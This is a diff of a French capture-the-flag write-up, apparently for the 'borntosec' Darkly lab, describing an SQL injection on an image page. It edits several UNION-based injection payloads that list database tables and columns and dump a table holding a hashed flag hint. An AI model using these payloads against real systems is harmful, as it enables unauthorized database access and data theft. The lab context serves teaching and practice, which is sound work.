@@ -40,10 +40,11 @@ Url : borntosec.ddns.net/images.png
 En utilisant une requête UNION pour lister les tables, nous trouvons :
 
 ```sql
-ID: 1 AND 1=1 UNION SELECT 1, table_name FROM information_schema.tables; --
+1 AND 1=1 UNION SELECT 1, table_name FROM information_schema.tables; --
+```
+
 Title: list_images
 Url : 1
-```
 
 La table `list_images` semble intéressante, nous allons nous concentrer dessus.
 
@@ -52,10 +53,10 @@ La table `list_images` semble intéressante, nous allons nous concentrer dessus.
 Nous listons les colonnes de la table `list_images` avec les requêtes suivantes :
 
 ```sql
-ID: 1 AND 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'list_images'; --
+1 AND 1=1 UNION SELECT table_name, column_name FROM information_schema.columns; --
 ```
 
-Les colonnes découvertes sont :
+Les colonnes découvertes ver list-images sont :
 
 ```sql
 ID: 1 AND 1=1 UNION SELECT table_name, column_name FROM information_schema.columns; --
@@ -80,7 +81,7 @@ Url : list_images
 Nous allons essayer de voir ce qu'il y a dans chacune de ces colonnes. En vérifiant les colonnes `title` et `comment`, nous trouvons des informations intéressantes :
 
 ```sql
-ID: 1 AND 1=1 UNION SELECT title, comment FROM list_images; --
+1 AND 1=1 UNION SELECT title, comment FROM list_images; --
 Title: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
 Url : Hack me ?
 ```
